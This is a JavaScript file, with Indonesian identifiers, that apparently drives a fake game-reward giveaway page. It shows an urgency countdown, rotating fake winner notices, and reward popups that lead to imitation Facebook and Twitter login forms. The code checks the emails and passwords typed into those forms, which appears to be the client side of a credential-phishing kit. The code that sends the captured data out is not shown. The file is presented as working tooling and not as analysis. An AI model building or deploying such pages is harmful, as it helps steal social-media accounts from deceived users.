// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing countdown timer
$(document).ready(function() {
    var detik = 59;
    var menit = 59;
    var jam = 23;
	
    function hitung() {
		setTimeout(hitung, 1000);
        $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});

// code for random id
var slidePlayer = 0;
openSlides();
function openSlides() {
    var i;
    var slides = document.getElementsByClassName("playerStatus");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slidePlayer++;
    if (slidePlayer > slides.length) {slidePlayer = 1} 
    slides[slidePlayer-1].style.display = "block"; 
    setTimeout(openSlides, 2500);
}

// code for showing hiding popup
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_account_login(){
	$('.account_login').show();
	$(".itemReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_otherPopup(){
	$(".welcome").hide()
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

// code for validate data to next step
function validateLoginFb() {
    $emailfb = $('#email-facebook').val().trim();
    $passwordfb = $('#password-facebook').val().trim();
    if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
        $('.email-fb').show();
        $('.sandi-fb').hide();
        return false;
    } else {
        $('.email-fb').hide();
    }
    if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
        $('.sandi-fb').show();
        return false;
    } else {
        $('.sandi-fb').hide();
    }
}

function validateLoginTwitter() {
    $emailtw = $('#email-twitter').val().trim();
    $passwordtw = $('#password-twitter').val().trim();
    if ($emailtw == '' || $emailtw == null || $emailtw.length <= 5) {
        $('.email-tw').show();
        $('.sandi-tw').hide();
        return false;
    } else {
        $('.email-tw').hide();
    }
    if ($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 5) {
        $('.sandi-tw').show();
        return false;
    } else {
        $('.sandi-tw').hide();
    }
}

// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}